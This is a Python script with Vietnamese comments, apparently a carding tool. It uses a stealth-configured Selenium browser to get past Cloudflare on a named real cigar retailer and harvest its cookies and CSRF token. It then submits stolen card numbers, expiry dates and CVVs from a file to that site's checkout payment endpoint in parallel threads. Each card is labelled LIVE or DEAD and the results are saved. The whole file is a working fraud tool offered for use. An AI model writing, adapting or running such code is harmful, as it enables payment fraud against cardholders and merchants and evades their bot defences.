#!/usr/bin/env python3
"""
Credit Card Checker Tool - Auto Version
Tự động bypass Cloudflare bằng selenium
"""

import time
import json
import argparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple
import urllib.parse

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException
except ImportError:
    print("[!] Cần cài đặt selenium: pip install selenium")
    exit(1)

try:
    import requests
except ImportError:
    print("[!] Cần cài đặt requests: pip install requests")
    exit(1)


class CardCheckerAuto:
    def __init__(self, threads: int = 5, timeout: int = 30, headless: bool = True):
        """
        Khởi tạo CardChecker với selenium auto bypass
        
        Args:
            threads: Số luồng chạy song song
            timeout: Timeout cho mỗi request (giây)
            headless: Chạy browser ẩn
        """
        self.threads = threads
        self.timeout = timeout
        self.headless = headless
        self.session = requests.Session()
        
        self.url = 'https://www.pipesandcigars.com/on/demandware.store/Sites-PC-Site/default/CheckoutServices-SubmitPayment'
        self.base_url = 'https://www.pipesandcigars.com'
        
        # Cookies và CSRF token sẽ được lấy tự động
        self.cookies = {}
        self.csrf_token = None
        
        print("[*] Khởi tạo browser để bypass Cloudflare...")
        self._init_browser()
        
    def _init_browser(self):
        """Khởi tạo selenium browser"""
        chrome_options = Options()
        
        if self.headless:
            chrome_options.add_argument('--headless=new')
        
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        # User agent
        chrome_options.add_argument('user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36')
        
        try:
            self.driver = webdriver.Chrome(options=chrome_options)
            print("[✓] Browser đã khởi tạo")
        except Exception as e:
            print(f"[!] Lỗi khởi tạo browser: {e}")
            print("[!] Hãy cài đặt ChromeDriver: brew install chromedriver")
            exit(1)
    
    def get_cookies_and_csrf(self):
        """
        Tự động lấy cookies và CSRF token từ website
        """
        print(f"[*] Đang truy cập {self.base_url}...")
        
        try:
            # Truy cập trang chủ
            self.driver.get(self.base_url)
            
            # Đợi Cloudflare challenge
            print("[*] Đợi bypass Cloudflare...")
            time.sleep(5)  # Đợi Cloudflare challenge
            
            # Kiểm tra xem đã bypass chưa
            if "Just a moment" in self.driver.page_source:
                print("[*] Đang giải Cloudflare challenge...")
                time.sleep(10)  # Đợi thêm
            
            # Lấy cookies
            selenium_cookies = self.driver.get_cookies()
            for cookie in selenium_cookies:
                self.cookies[cookie['name']] = cookie['value']
                self.session.cookies.set(cookie['name'], cookie['value'])
            
            print(f"[✓] Đã lấy {len(self.cookies)} cookies")
            
            # Thử truy cập trang checkout để lấy CSRF token
            try:
                checkout_url = f"{self.base_url}/checkout"
                self.driver.get(checkout_url)
                time.sleep(3)
                
                # Tìm CSRF token trong page source
                page_source = self.driver.page_source
                
                # Tìm csrf_token trong input hidden
                import re
                csrf_match = re.search(r'name="csrf_token"\s+value="([^"]+)"', page_source)
                if csrf_match:
                    self.csrf_token = csrf_match.group(1)
                    print(f"[✓] Đã lấy CSRF token: {self.csrf_token[:50]}...")
                else:
                    print("[!] Không tìm thấy CSRF token, sẽ thử lấy từ response")
                    
            except Exception as e:
                print(f"[!] Không thể truy cập checkout: {e}")
            
            return True
            
        except Exception as e:
            print(f"[!] Lỗi khi lấy cookies: {e}")
            return False
    
    def close_browser(self):
        """Đóng browser"""
        if hasattr(self, 'driver'):
            self.driver.quit()
            print("[*] Đã đóng browser")
    
    def parse_card(self, card_line: str) -> Dict[str, str]:
        """Parse thông tin thẻ từ string"""
        card_line = card_line.strip()
        if not card_line or card_line.startswith('#'):
            return None
            
        parts = card_line.split('|')
        if len(parts) < 3:
            return None
            
        card_number = parts[0].strip().replace(' ', '')
        
        # Parse exp date
        if '/' in parts[1]:
            exp_parts = parts[1].split('/')
            exp_month = exp_parts[0].strip()
            exp_year = exp_parts[1].strip()
            cvv = parts[2].strip() if len(parts) > 2 else ''
        else:
            exp_month = parts[1].strip()
            exp_year = parts[2].strip() if len(parts) > 2 else ''
            cvv = parts[3].strip() if len(parts) > 3 else ''
        
        # Đảm bảo exp_year có 4 chữ số
        if len(exp_year) == 2:
            exp_year = '20' + exp_year
            
        # Xác định loại thẻ
        if card_number.startswith('4'):
            card_type = 'Visa'
        elif card_number.startswith('5'):
            card_type = 'Master Card'
        elif card_number.startswith('3'):
            card_type = 'American Express'
        else:
            card_type = 'Unknown'
        
        # Parse billing info nếu có
        billing_info = {}
        if len(parts) >= 11:
            billing_info = {
                'name': parts[4].strip(),
                'address': parts[5].strip(),
                'city': parts[6].strip(),
                'state': parts[7].strip(),
                'zip': parts[8].strip(),
                'country': parts[9].strip(),
                'phone': parts[10].strip()
            }
            
        return {
            'number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'cvv': cvv,
            'type': card_type,
            'billing': billing_info
        }
    
    def build_payload(self, card: Dict[str, str]) -> str:
        """Tạo payload cho request"""
        billing = card.get('billing', {})
        
        # Nếu không có CSRF token, dùng giá trị mặc định
        csrf = self.csrf_token if self.csrf_token else ''
        
        data = {
            'dwfrm_billing_addressFields_typeID': 'useShippingAddress',
            'dwfrm_billing_addressFields_addressNickname': billing.get('name', 'Michael'),
            'dwfrm_billing_addressFields_firstName': billing.get('name', 'Michael').split()[0] if billing.get('name') else 'Michael',
            'dwfrm_billing_addressFields_lastName': billing.get('name', 'Johnson').split()[-1] if billing.get('name') else 'Johnson',
            'dwfrm_billing_addressFields_companyName': '',
            'dwfrm_billing_addressFields_address1': billing.get('address', '350 5th Ave'),
            'dwfrm_billing_addressFields_address2': '',
            'dwfrm_billing_addressFields_city': billing.get('city', 'New York'),
            'dwfrm_billing_addressFields_country': billing.get('country', 'US'),
            'dwfrm_billing_addressFields_states_stateCode': billing.get('state', 'NY'),
            'dwfrm_billing_addressFields_isBilling': 'true',
            'dwfrm_billing_addressFields_postalCode': billing.get('zip', '10118-0100'),
            'dwfrm_billing_contactInfoFields_phone': billing.get('phone', '2175551234'),
            'dwfrm_billing_addressFields_phoneNumberExtension': '',
            'dwfrm_billing_addressFields_residentialOrBusiness': 'Residential',
            'csrf_token': csrf,
            'localizedNewAddressTitle': 'new',
            'dwfrm_billing_paymentMethod': 'CREDIT_CARD',
            'dwfrm_billing_creditCardFields_cardType': card['type'],
            'dwfrm_billing_creditCardFields_cardNumber': card['number'],
            'dwfrm_billing_creditCardFields_expirationMonth': card['exp_month'],
            'dwfrm_billing_creditCardFields_expirationYear': card['exp_year'],
            'dwfrm_billing_creditCardFields_securityCode': card['cvv'],
        }
        
        return urllib.parse.urlencode(data)
    
    def check_card(self, card: Dict[str, str], verbose: bool = False) -> Tuple[str, str, str]:
        """Kiểm tra một thẻ"""
        card_info = f"{card['number']}|{card['exp_month']}/{card['exp_year']}|{card['cvv']}"
        
        try:
            payload = self.build_payload(card)
            
            headers = {
                'accept': '*/*',
                'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.pipesandcigars.com',
                'referer': 'https://www.pipesandcigars.com/checkout',
                'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest'
            }
            
            response = self.session.post(
                self.url,
                headers=headers,
                data=payload,
                timeout=self.timeout
            )
            
            status_code = response.status_code
            
            if verbose:
                print(f"\n[DEBUG] Status: {status_code}")
                print(f"[DEBUG] Response: {response.text[:300]}\n")
            
            if status_code == 200:
                try:
                    json_response = response.json()
                    
                    if json_response.get('success') == True:
                        return (card_info, 'LIVE', 'Card approved ✓')
                    elif 'error' in json_response:
                        error_msg = json_response.get('error', '')
                        if 'declined' in error_msg.lower() or 'invalid' in error_msg.lower():
                            return (card_info, 'DEAD', f'{error_msg}')
                        else:
                            return (card_info, 'UNKNOWN', f'{error_msg}')
                    elif 'errorMessage' in json_response:
                        error_msg = json_response.get('errorMessage', '')
                        if 'declined' in error_msg.lower() or 'invalid' in error_msg.lower():
                            return (card_info, 'DEAD', f'{error_msg}')
                        else:
                            return (card_info, 'UNKNOWN', f'{error_msg}')
                    else:
                        response_text = response.text.lower()
                        if 'success' in response_text or 'approved' in response_text:
                            return (card_info, 'LIVE', 'Approved ✓')
                        elif 'declined' in response_text or 'invalid' in response_text:
                            return (card_info, 'DEAD', 'Declined')
                        else:
                            return (card_info, 'UNKNOWN', f'{response.text[:100]}')
                            
                except json.JSONDecodeError:
                    response_text = response.text.lower()
                    if 'success' in response_text or 'approved' in response_text:
                        return (card_info, 'LIVE', 'Approved ✓')
                    elif 'declined' in response_text or 'invalid' in response_text:
                        return (card_info, 'DEAD', 'Declined')
                    else:
                        return (card_info, 'UNKNOWN', f'{response.text[:100]}')
            elif status_code == 403:
                return (card_info, 'ERROR', 'Cloudflare blocked')
            else:
                return (card_info, 'ERROR', f'HTTP {status_code}')
                
        except Exception as e:
            return (card_info, 'ERROR', f'{str(e)}')
    
    def check_cards_from_file(self, input_file: str, output_file: str = None, verbose: bool = False):
        """Check danh sách thẻ từ file"""
        print(f"\n[*] Đọc file: {input_file}")
        
        # Đọc danh sách thẻ
        cards = []
        with open(input_file, 'r') as f:
            for line in f:
                card = self.parse_card(line)
                if card:
                    cards.append(card)
        
        total = len(cards)
        print(f"[*] Tổng số thẻ: {total}")
        print(f"[*] Số luồng: {self.threads}\n")
        
        # Kết quả
        results = {
            'live': [],
            'dead': [],
            'unknown': [],
            'error': []
        }
        
        checked = 0
        start_time = time.time()
        
        print("="*60)
        print("BẮT ĐẦU CHECK")
        print("="*60 + "\n")
        
        # Check song song
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.check_card, card, verbose): card for card in cards}
            
            for future in as_completed(futures):
                card_info, status, message = future.result()
                checked += 1
                
                # Hiển thị kết quả với màu
                if status == 'LIVE':
                    print(f"✓ LIVE  | {card_info} | {message}")
                    results['live'].append({'card': card_info, 'message': message})
                elif status == 'DEAD':
                    print(f"✗ DEAD  | {card_info} | {message}")
                    results['dead'].append({'card': card_info, 'message': message})
                elif status == 'UNKNOWN':
                    print(f"? UNKN  | {card_info} | {message}")
                    results['unknown'].append({'card': card_info, 'message': message})
                else:
                    print(f"! ERROR | {card_info} | {message}")
                    results['error'].append({'card': card_info, 'message': message})
                
                # Hiển thị tiến độ
                elapsed = time.time() - start_time
                rate = checked / elapsed if elapsed > 0 else 0
                remaining = total - checked
                eta = remaining / rate if rate > 0 else 0
                print(f"  [{checked}/{total}] {checked*100//total}% | {rate:.1f} cpm | ETA: {eta:.0f}s\n")
        
        # Tổng kết
        print("="*60)
        print("KẾT QUẢ")
        print("="*60)
        print(f"Tổng: {total} | ✓ {len(results['live'])} | ✗ {len(results['dead'])} | ? {len(results['unknown'])} | ! {len(results['error'])}")
        print(f"Thời gian: {time.time() - start_time:.1f}s | Tốc độ: {total/(time.time() - start_time)*60:.1f} cards/phút")
        print("="*60)
        
        # Lưu kết quả
        if output_file:
            self.save_results(results, output_file)
            print(f"\n[*] Đã lưu: {output_file}")
        
        return results
    
    def save_results(self, results: Dict, output_file: str):
        """Lưu kết quả vào file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(f"# Card Checker Results - {timestamp}\n")
            f.write(f"# Total: {sum(len(v) for v in results.values())}\n\n")
            
            f.write(f"# ✓ LIVE ({len(results['live'])})\n")
            for item in results['live']:
                f.write(f"{item['card']} | {item['message']}\n")
            
            f.write(f"\n# ✗ DEAD ({len(results['dead'])})\n")
            for item in results['dead']:
                f.write(f"{item['card']} | {item['message']}\n")
            
            f.write(f"\n# ? UNKNOWN ({len(results['unknown'])})\n")
            for item in results['unknown']:
                f.write(f"{item['card']} | {item['message']}\n")
            
            f.write(f"\n# ! ERROR ({len(results['error'])})\n")
            for item in results['error']:
                f.write(f"{item['card']} | {item['message']}\n")


def main():
    parser = argparse.ArgumentParser(
        description='Credit Card Checker - Auto Version (Selenium)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python card_checker_auto.py -i cards.txt
  python card_checker_auto.py -i cards.txt -o results.txt -t 10
  python card_checker_auto.py -i cards.txt --no-headless  # Hiện browser
        """
    )
    
    parser.add_argument('-i', '--input', required=True, help='File chứa danh sách thẻ')
    parser.add_argument('-o', '--output', help='File lưu kết quả')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Số luồng (default: 5)')
    parser.add_argument('--timeout', type=int, default=30, help='Timeout (default: 30s)')
    parser.add_argument('--no-headless', action='store_true', help='Hiện browser')
    parser.add_argument('-v', '--verbose', action='store_true', help='Debug mode')
    
    args = parser.parse_args()
    
    checker = CardCheckerAuto(
        threads=args.threads,
        timeout=args.timeout,
        headless=not args.no_headless
    )
    
    try:
        # Lấy cookies và CSRF token tự động
        if checker.get_cookies_and_csrf():
            # Check thẻ
            checker.check_cards_from_file(args.input, args.output, args.verbose)
        else:
            print("[!] Không thể lấy cookies, thoát...")
    finally:
        # Đóng browser
        checker.close_browser()


if __name__ == '__main__':
    main()
